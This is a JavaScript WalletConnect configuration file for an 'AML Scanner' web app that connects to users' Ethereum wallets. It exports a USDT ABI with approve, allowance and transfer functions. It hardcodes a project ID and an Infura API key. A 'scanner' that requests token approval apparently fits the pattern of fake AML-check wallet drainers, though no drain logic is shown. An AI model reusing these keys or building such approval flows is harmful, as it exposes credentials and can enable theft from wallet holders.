/**
 * WalletConnect Configuration for AML Scanner
 * Real WalletConnect v2 integration with your project ID
 */

import { EthereumProvider } from '@walletconnect/ethereum-provider';
import { WalletConnectModal } from '@walletconnect/modal';

// Your WalletConnect Project ID
export const WALLETCONNECT_PROJECT_ID = '1ea612ae18e195ab099977874e802c19';

// Supported networks configuration
export const SUPPORTED_CHAINS = {
  ethereum: {
    chainId: 1,
    name: 'Ethereum',
    currency: 'ETH',
    rpcUrl: 'https://mainnet.infura.io/v3/07908a5d9d154d3194e445bceb298d28',
    explorerUrl: 'https://etherscan.io'
  },
  // Note: Tron is not directly supported by WalletConnect v2 EthereumProvider
  // We'll handle Tron through direct TronLink integration
};

// Get the current origin for mobile compatibility
const getCurrentOrigin = () => {
  if (typeof window !== 'undefined') {
    return window.location.origin;
  }
  return process.env.REACT_APP_PRODUCTION_URL || 'https://aml.ott-investments.com';
};

// Create WalletConnect provider for Ethereum with mobile support
export const createEthereumProvider = async (uri) => {
  const provider = await EthereumProvider.init({
    projectId: WALLETCONNECT_PROJECT_ID,
    chains: [1], // Ethereum mainnet
    showQrModal: false, // We'll handle QR display ourselves
    metadata: {
      name: 'AML Scanner',
      description: 'Anti-Money Laundering Scanner for USDT Transactions',
      url: getCurrentOrigin(),
      icons: ['https://aml.ott-investments.com/favicon.ico']
    },
    // Add mobile-specific configuration
    optionalChains: [1],
    optionalMethods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData'],
    optionalEvents: ['chainChanged', 'accountsChanged'],
    // Enable mobile deep linking
    enableExplorer: true,
    explorerRecommendedWalletIds: 'ALL',
    explorerExcludedWalletIds: 'ALL',
    // Add redirect URLs for mobile
    redirectUrl: getCurrentOrigin(),
  });
  // This is critical: connect the provider to the session!
  await provider.connect({ uri });
  return provider;
};

// Create Web3Modal instance for better UX
export const createModal = () => {
  return new WalletConnectModal({
    projectId: WALLETCONNECT_PROJECT_ID,
    chains: [1], // Ethereum mainnet
    metadata: {
      name: 'AML Scanner',
      description: 'Anti-Money Laundering Scanner for USDT Transactions',
      url: getCurrentOrigin(),
      icons: ['https://aml.ott-investments.com/favicon.ico']
    },
    // Add mobile support
    enableExplorer: true,
    explorerRecommendedWalletIds: 'ALL',
    explorerExcludedWalletIds: 'ALL',
    // Add redirect URLs for mobile
    redirectUrl: getCurrentOrigin(),
  });
};

// USDT Contract ABI (only the functions we need)
export const USDT_ABI = [
  {
    "constant": false,
    "inputs": [
      {"name": "_spender", "type": "address"},
      {"name": "_value", "type": "uint256"}
    ],
    "name": "approve",
    "outputs": [{"name": "", "type": "bool"}],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [
      {"name": "_owner", "type": "address"},
      {"name": "_spender", "type": "address"}
    ],
    "name": "allowance",
    "outputs": [{"name": "", "type": "uint256"}],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [{"name": "_owner", "type": "address"}],
    "name": "balanceOf",
    "outputs": [{"name": "", "type": "uint256"}],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [
      {"name": "_to", "type": "address"},
      {"name": "_value", "type": "uint256"}
    ],
    "name": "transfer",
    "outputs": [{"name": "", "type": "bool"}],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
  }
];

// Contract addresses
export const CONTRACT_ADDRESSES = {
  USDT_ETHEREUM: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  USDT_TRON: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
};
